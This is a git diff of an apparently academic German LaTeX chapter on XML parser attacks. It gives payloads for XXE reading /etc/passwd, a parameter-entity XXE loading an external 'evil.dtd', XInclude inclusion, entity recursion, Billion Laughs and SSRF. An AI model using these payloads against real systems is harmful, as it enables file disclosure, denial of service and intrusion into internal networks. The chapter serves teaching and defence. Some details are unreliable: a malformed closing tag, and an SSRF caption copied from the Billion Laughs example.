@@ -180,11 +180,107 @@ Einige der Features des \acrshort{xml}-Ökosystems können für Angriffe auf Par
 
 Obwohl Angriffe zum Teil seit Jahren bekannt sind, sind viele XML-Parser weiterhin verwundbar -- Forscher der Ruhr-Universität Bochum fanden Sicherheitslücken in den Standardkonfigurationen von 25 der 33 gestesteten \acrshort{xml}-Parser~\cite{spaeth2016sok}.
 
-\begin{description}
-    \item[\acrlong{dos}] Angriffe dieser Kategorie zielen drauf ab, einen Dienst unerreichbar für andere Nutzer zu machen, indem er -- oder der Server auf dem er läuft -- überlastet wird.
-    \item[File System Access] Hierbei soll der \acrshort{xml}-Parser dazu gebracht werden, eine normalerweise nicht zugängliche Datei auf dem lokalen Dateisystem in ein \acrshort{xml}-Dokument einzubetten.
-    \item[\acrlong{ssrf}] Durch manipulierte \acrshort{xml}-Dateien soll ein Parser dazu gebracht werden, einen Request an einen anderen Netzwerkteilnehmer zu senden. Dies ist üblicherweise ein Dienst, auf dem der Angreifer aufgrund einer Firewall keinen direkten Zugriff hat, der sich aber in der gleichen Firewall-Zone wie die \acrshort{xml}-Applikation befindet.
-\end{description}
+\subsubsection{\acrlong{fsa}}
+Hierbei soll der \acrshort{xml}-Parser dazu gebracht werden, eine normalerweise nicht zugängliche Datei auf dem lokalen Dateisystem in ein \acrshort{xml}-Dokument einzubetten. Kann der Angreifer die Zielapplikation dazu bringen, ihm Zugriff auf das Dokument zu gewähren, erlangt er Kenntnis vom Inhalt der Datei.
+
+\paragraph{\acrfull{xxe}}
+\acrshort{xxe}-Angriffe sind bereits seit 2002 bekannt~\cite{steuck2002xxe}. Der Angreifer gibt dabei den Pfad zu einer lokalen Datei auf dem Server in Form einer File-URL in einer External Entity an und refenziert diese Entity dann im Dokument. Enthält der eingebette Inhalt jedoch Zeichen, die von XML als Markup interpretiert werden, kann dies unter Umständen dazu führen, dass das resultierende Dokument nicht mehr wohlgeformt ist und der Angriff fehlschlägt.~\cite[Abschnitt 5.1]{spaeth2016sok}
+
+\begin{example}[Klassischer \acrshort{xxe}-Angriff] Der \acrshort{xml}-Parser wird angewiesen, den Inhalt der Datei \texttt{/etc/passwd} in das Dokument einzubetten.
+    \begin{minted}{xml}
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>
+    \end{minted}
+\end{example}
+
+\paragraph{Parameter-Entity-based \acrfull{xxe}} Im Gegensatz zu klassischen \acrshort{xxe}-Angriffen kann der Dateiinhalt bei \gls{xxe} mit \emph{Parameter Entities} in eine CDATA"~Sektion eingebettet werden. Dies wird durch Anlegen mehrerer solcher Entities erreicht, die Beginn und Ende der CDATA"~Sektion sowie den Dateiinhalt enthalten und im Anschluss zusammengesetzt werden.~\cite[S.~10]{morgan2014xml}
+
+\begin{example}[\acrshort{xxe}-Angriff mit Parameter Entities]
+    Hier versucht ein Angreifer, den Inhalt der Datei \texttt{/etc/passwd} innerhalb einer CDATA-Sektion zu platzieren und diese in das XML-Dokument zufügen.
+    \begin{minted}{xml}
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+  <!ENTITY % start "<![CDATA[">
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % end "]]>">
+  <!ENTITY % dtd SYSTEM "http://example.com/evil.dtd">
+  %dtd;
+]>
+<root>&all;</root>
+    \end{minted}
+    \captionof{figure}{Im Hauptdokument werden eine Reihe von \emph{Parameter Entities} angelegt, die dann in einem externen DTD zusammengesetzt werden.}
+
+    \begin{minted}{xml}
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY all "%start;%file;%end;">
+    \end{minted}
+    \captionof{figure}{Die \acrshort{dtd}-Datei wurde vom Angreifer unter der \acrshort{url} \texttt{http://example.com/evil.dtd} abgelegt.}
+\end{example}
+
+\paragraph{\acrshort{xinclude}}
+
+Auch bei Angriffen auf Basis von \gls{xinclude} enthält das zu parsende \acrshort{xml}-Dokument eine Anweisung zum Einbetten einer lokalen Datei. Im Gegensatz zu klassischen \acrshort{xxe}-Angriffen kann der eingebette Inhalt jedoch beliebiger Text sein, darf also z.B. auch ungültiges \acrshort{xml}-Markup enthalten.~\cite[S.~12]{morgan2014xml}
+
+\begin{example}[\acrshort{xinclude}-Angriff] Der \acrshort{xml}-Parser wird angewiesen, den Inhalt der Datei \texttt{/etc/passwd} in das Dokument einzubetten.
+    \begin{minted}{xml}
+<?xml version="1.0" encoding="UTF-8"?>
+<root xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include href="file:///etc/passwd" parse="text" />
+/root>
+    \end{minted}
+\end{example}
+
+\subsubsection{\acrfull{dos}}
+
+Angriffe dieser Kategorie zielen drauf ab, einen Dienst unerreichbar für andere Nutzer zu machen, indem er -- oder der Server, auf dem er läuft -- überlastet wird. Dazu wird in der Regel versucht, den zur Verfügung stehende Arbeitsspeicher zu füllen oder die \acrshort{cpu} über längere Zeit auszulasten. Zudem können Angriffsvektoren aus dem Bereich \acrlong{fsa} für \acrshort{dos}-Angriffe eingesetzt werden, indem der Parser angewiesen wird, extrem große bzw. niemals endende Dateien wie \texttt{/dev/random} zu lesen.
+
+\paragraph{Entity Recursion Attack}
+Hierbei werden Entities so angelegt, dass sie auf sich selbst verweisen. Zwar sind direkte und indirekte Selbstreferenzierung von Entites in der \acrshort{xml}"~Spezifikation explizit verboten~\cite[Abschnitt 4.1]{maler2008xml}, naive Parser könnten aber trotzdem in eine Endlosschleife verfallen.
+
+\begin{example}[Entity Recursion] Die Entität \mintinline{xml}{&a;} verweist indirekt auf sich selbst.
+    \begin{minted}{xml}
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY a "&b;">
+  <!ENTITY b "&a;">
+]>
+<root>&a;</root>
+    \end{minted}
+\end{example}
+
+\paragraph{Exponential Entity Attack (Billion Laughs)}
+Indem interne Entities über mehrere Ebenen ineinander verschachtelt werden, wird der Parser dazu gebracht, eine große Menge von Arbeitsspeicher zu allozieren. Eine mögliche Gegenmaßnahme ist die Begrenzung der Anzahl von erlaubten Entity-Referenzen.
+
+\begin{example}[Billion Laughs] Die expandierte Entity \mintinline{xml}{&x9;} belegt $\SI[parse-numbers=false]{3 \cdot 10^9}{\byte}\allowbreak{}\approx \SI{2.7939}{\gibi\byte}$ im Arbeitsspeicher.
+    \begin{minted}{xml}
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY x "lol">
+  <!ENTITY x1 "&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;">
+  <!ENTITY x2 "&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;&x1;">
+  <!-- [...] -->
+  <!ENTITY x9 "&x8;&x8;&x8;&x8;&x8;&x8;&x8;&x8;&x8;&x8;">
+]>
+<root>&x9;</root>
+    \end{minted}
+\end{example}
+
+\paragraph{Quadratic Blowup Attack}
+Dieser Angriff ist eine Abwandlung der \emph{Billion Laughs Attack}. Es wird eine einzelne Entität angelegt, die einen extrem langem String enthält. Dieser wird nun mehrmals im Dokument referenziert, die Anzahl der verwendeten Referenzen ist jedoch im Vergleich zu \emph{Billion Laughs} gering, sodass eine mögliche Obergrenze für erlaubte Entity-Referenzen umgangen werden kann.
+
+\subsubsection{\acrlong{ssrf}}
+Durch manipulierte \acrshort{xml}-Dateien soll ein Parser dazu gebracht werden, eine Anfrage an einen anderen Netzwerkteilnehmer zu senden. Dies ist üblicherweise ein Dienst, auf den der Angreifer aufgrund einer Firewall keinen direkten Zugriff hat, der sich aber in der gleichen Firewall-Zone wie die \acrshort{xml}-Applikation befindet. So könnten beispielsweise \acrshort{http}-Requests an einen Webserver im Unternehmens-Intranet gesendet werden.
+
+\begin{example}[Klassische SSRF] Die expandierte Entity \mintinline{xml}{&x9;} belegt $\SI[parse-numbers=false]{3 \cdot 10^9}{\byte}\allowbreak{}\approx \SI{2.7939}{\gibi\byte}$ im Arbeitsspeicher.
+    \begin{minted}{xml}
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root SYSTEM "http://example.com/">
+<root />
+    \end{minted}
+\end{example}
 
 % TODO: Add stuff here
 
